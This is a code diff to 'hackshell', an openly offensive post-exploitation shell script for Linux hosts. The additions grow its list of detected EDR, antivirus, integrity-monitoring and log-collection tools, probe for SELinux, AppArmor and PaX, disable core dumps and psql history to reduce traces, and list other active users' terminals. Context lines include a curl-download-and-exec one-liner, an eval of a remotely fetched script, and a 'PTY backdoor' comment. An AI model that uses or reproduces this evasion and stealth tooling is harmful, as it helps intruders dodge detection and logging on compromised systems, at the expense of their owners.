@@ -22,6 +22,7 @@
 #    ROOTFS=        Set different root. [default: /]
 #
 # 2024-2025 by Messede, DoomeD, skpr
+# Similar work: https://github.com/zMarch/Orc
 
 _HSURL="https://github.com/hackerschoice/hackshell/raw/main/hackshell.sh"
 _HSURLORIGIN=
@@ -149,6 +150,11 @@ xsu() {
     export _HS_HOME_ORIG="$bak"
 }
 
+xanew() {
+    [ $# -ne 0 ] && { HS_ERR "Parameters not supported"; return 255; }
+    awk 'hit[$0]==0 {hit[$0]=1; print $0}' # "${arr[@]}"
+}
+
 xtmux() {
     local sox="${TMPDIR}/.tmux-${UID}"
     # Can not live in XHOME because XHOME is wiped on exit()
@@ -200,6 +206,7 @@ import sys
 ${opts_init}
 sys.stdout.buffer.write(urllib.request.urlopen(\"$url\", $opts).read())"
 }
+
 
 
 surl() {
@@ -960,11 +967,14 @@ _warn_edr() {
     _hs_chk_fn() { { [ -z "${1}" ] || [ ! -e "${1:?}" ]; } && return; fns+=("${1:?}"); out+="${2:?}: $1"$'\n';}
 
     _hs_chk_fn "/usr/lib/Acronis"                           "Acronis Cyber Protect"
+    _hs_chk_fn "/etc/aide/aide.conf"                        "Advanced Intrusion Detection Environment (AIDE)"
     _hs_chk_fn "/etc/init.d/avast"                          "Avast"
     _hs_chk_fn "/var/lib/avast/Setup/avast.vpsupdate"       "Avast"
     _hs_chk_fn "/etc/init.d/avgd"                           "AVG"
     _hs_chk_fn "/opt/avg"                                   "AVG"
     _hs_chk_fn "/var/log/checkpoint"                        "Checkpoint"
+    # This is so old and wont find any modern rootkits.
+    _hs_chk_fn "/etc/chkrootkit"                            "chkrootkit [chkrootkit -q]"
     _hs_chk_fn "/opt/cisco/amp/bin/ampcli"                  "Cisco Secure Endpoint"
     _hs_chk_fn "/etc/clamd.d/scan.conf"                     "ClamAV"
     _hs_chk_fn "$(command -v clamscan)"                     "ClamAV"
@@ -978,6 +988,7 @@ _warn_edr() {
     _hs_chk_fn "/opt/isec"                                  "FireEye/Trellix Endpoint Security"
     _hs_chk_fn "/opt/McAfee"                                "FireEye/McAfee/Trellix Agent"
     _hs_chk_fn "/opt/Trellix"                               "FireEye/McAfee/Trellix SIEM Collector"
+    _hs_chk_fn "/etc/fluent-bit"                            "Fluent Bit Log Collector"
     _hs_chk_fn "/opt/FortiEDRCollector"                     "Fortinet FortiEDR"
     _hs_chk_fn "/opt/fortinet/fortisiem"                    "Fortinet FortiSIEM"
     _hs_chk_fn "/etc/init.d/fortisiem-linux-agent"          "Fortinet FortiSIEM"
@@ -995,8 +1006,8 @@ _warn_edr() {
     _hs_chk_fn "/var/pt"                                    "PT Swarm"
     _hs_chk_fn "/usr/local/qualys"                          "Qualys EDR Cloud Agent"
     _hs_chk_fn "/etc/init.d/qualys-cloud-agent"             "Qualys EDR Cloud Agent"
-    _hs_chk_fn "/etc/rkhunter.conf"                         "RootKit Hunter"
-    _hs_chk_fn "$(command -v rkhunter)"                     "RootKit Hunter"
+    _hs_chk_fn "/etc/rkhunter.conf"                         "RootKit Hunter [rkhunter -c -l /dev/shm/.rk --sk --nomow --rwo; rm -f /dev/shm/.rk]"
+    _hs_chk_fn "$(command -v rkhunter)"                     "RootKit Hunter [rkhunter -c -l /dev/shm/.rk --sk --nomow --rwo; rm -f /dev/shm/.rk]"
     _hs_chk_fn "/etc/safedog/sdsvrd.conf"                   "Safedog"
     _hs_chk_fn "/etc/safedog/server/conf/sdsvrd.conf"       "Safedog"
     _hs_chk_fn "/sf/edr/agent/bin/edr_agent"                "Sangfor EDR"
@@ -1013,6 +1024,7 @@ _warn_edr() {
     _hs_chk_fn "/opt/threatconnect-envsvr/"                 "ThreatConnect"
     _hs_chk_fn "/etc/init.d/threatconnect-envsvr"           "ThreatConnect"
     _hs_chk_fn "/titan/agent/agent_update.sh"               "Titan Agent"
+    _hs_chk_fn "/etc/tripwire"                              "TripWire"
     _hs_chk_fn "/etc/init.d/ds_agent"                       "Trend Micro Deep Instinct"
     _hs_chk_fn "/opt/ds_agent/dsa"                          "Trend Micro Deep Security Agent"
     _hs_chk_fn "/etc/init.d/splx"                           "Trend Micro Server Protect"
@@ -1079,7 +1091,30 @@ _warn_edr() {
         echo -en "${CN}"
     }
 
+    unset out
+    selinuxenabled &>/dev/null && out+="SELinux is enabled [getenforce;getsebool -a;sestatus]"$'\n'
+    aa-status &>/dev/null && out+="AppArmor is enabled"$'\n'
+    grep -Fqam1 PaX /proc/self/status 2>/dev/null && out+="GrSec and PaX are enabled"$'\n'
+    [ -n "$out" ] && {
+        echo -e "${CR}Security Modules enabled${CF}"
+        echo -n "$out"
+        echo -en "${CN}"
+    }
+
     unset -f _hs_chk_systemd _hs_chk_fn
+}
+
+xpty() {
+    local our_pty="$(tty)"
+    our_pty="${our_pty##*/}"
+
+    stat /dev/pts/* -c '%n %X %U' |
+    our_pty="$our_pty" awk -v now="$(date +%s)" '$1 ~ /\/[0-9]+$/ {
+      gsub( /[^0-9]/, "", $1 )
+      list[$1]=now-$2 "\t PTY " $1 " user " $3
+      if( $1==ENVIRON["our_pty"] ) list[$1]=list[$1] " ** this is us **"}
+      END {for(i in list) print list[i]}' | sort -rn
+    # reminder: do not use gawk functions, e.g. systime
 }
 
 # Warn if there are other root kits found.
@@ -1142,7 +1177,7 @@ lootlight() {
             command -v lsof >/dev/null && lsof -n "$fn" &>/dev/null && str="[ACTIVE]"
             echo "$(ls -al "$fn")"$'\t'"${str}"
         done
-        echo -e "${CN}"
+        echo -en "${CN}"
     }
 
     [ "$UID" -ne 0 ] && {
@@ -1624,6 +1659,8 @@ ${CY}>>>>> ${CDC}curl -obash -SsfL '$str' && chmod 700 bash && exec ./bash -il"
         trap hs_exit SIGHUP SIGTERM SIGPIPE
     fi
 
+    ulimit -c 0 &>/dev/null # Disable core dumps
+
     setsid --help 2>/dev/null | grep -Fqm1 -- --wait && _HS_SETSID_WAIT=1
 
     HS_SSH_OPT=()
@@ -1695,9 +1732,13 @@ hs_init_alias_reinit() {
     which curl &>/dev/null && curl --help 2>/dev/null | grep -iqm1 proto-default && alias curl="HOME=/dev/null curl --proto-default https"
     alias curl &>/dev/null || alias curl='HOME=/dev/null curl'
     which wget &>/dev/null && wget --help 2>/dev/null | grep -Fqm1 -- --no-hsts && alias wget="wget --no-hsts"
+
+    unalias anew &>/dev/null
+    which anew &>/dev/null || alias anew=xanew
 }
 
 hs_init_alias() {
+    :
     alias ssh="ssh ${HS_SSH_OPT[*]}"
     alias scp="scp ${HS_SSH_OPT[*]}"
     alias vi="vi -i NONE"
@@ -1726,6 +1767,8 @@ hs_init_shell() {
     export LESSHISTFILE=-
     export REDISCLI_HISTFILE=/dev/null
     export MYSQL_HISTFILE=/dev/null
+    export PSQL_HISTORY=/dev/null
+
     export T=.$'\t''~?$?'".${UID}"
     # PTY backdoor to not sniff when using sudo/su.
     export LC_PTY=1
@@ -1751,6 +1794,32 @@ hs_init_shell() {
             # PS1='\[\033[36m\]\u\[\033[m\]@\[\033[32m\]\h:\[\033[33;1m\]\w\[\033[m\]\$ '
         fi
     fi
+}
+
+hs_info() {
+    local now="$(date +%s)"
+    local mytty="$(tty 2>/dev/null)"
+    local u x t out
+    out="$(awk -F= 'toupper($1)~/PRETTY/ {gsub(/"/,"",$2); print $2}' /etc/*release 2>/dev/null | sort -u)"
+
+    [ -z "$out" ] && out="$(uname -s 2>/dev/null)"
+    [ -n "$out" ] && out+=" "
+    echo -en ">>> ${CDG}"
+    echo -n "${out}"
+    echo -en "${CG}${CF}[$(uname -r)]"
+    echo -e "${CN}"
+
+    # Show if any active PTY
+    stat /dev/pts/* -c '%X %U %n' | while read -r x; do
+        u="${x#* }"
+        u="${u%% *}"
+        t="${x##* }"
+        [[ "${t}" == "$mytty" ]] && continue
+        [[ "$((now - ${x%% *}))" -gt 3600 ]] && continue
+        echo -e "${CR}Active user: ${CDY}${u} ${CY}${CF}${t}"
+        ps a -o tty,pid,cmd 2>/dev/null | grep --color=never ^"${t#/dev/}" 2>/dev/null
+        echo -en "${CN}"
+    done
 }
 
 # shellcheck disable=SC2120
@@ -1797,6 +1866,7 @@ ${CDC} bin [<binary>]                        ${CDM}Download useful static binari
 ${CDC} dbin                                  ${CDM}Download static binary ${CN}${CF}[xhelp dbin]
 ${CDC} zapme [<name>]                        ${CDM}Hide args of current shell as <name> + all child processes
 ${CDC} lt, ltr, lss, lssr, psg, lsg, ...     ${CDM}Common useful commands
+${CDC} xpty, ...                             ${CDM}Common useful commands
 ${CDC} xhelp                                 ${CDM}This help"
     echo -e "${CN}"
     _hs_init_color
@@ -1815,6 +1885,8 @@ echo -e ">>> Type ${CDC}xhome${CN} to set HOME=${CDY}${XHOME}${CN}"
 echo -e ">>> Tweaking environment variables to log less     ${CN}[${CDG}DONE${CN}]"
 echo -e ">>> Creating aliases to make commands log less     ${CN}[${CDG}DONE${CN}]"
 echo -e ">>> ${CG}Setup complete. ${CF}No data was written to the filesystem${CN}"
+
+hs_info
 
 # Warning if thc.org is used
 [ -n "$_HSURLORIGIN" ] && HS_WARN "Better use: ' ${CDC}eval \"\$(curl -SsfL ${_HSURL})\"${CDM}'${CN}"
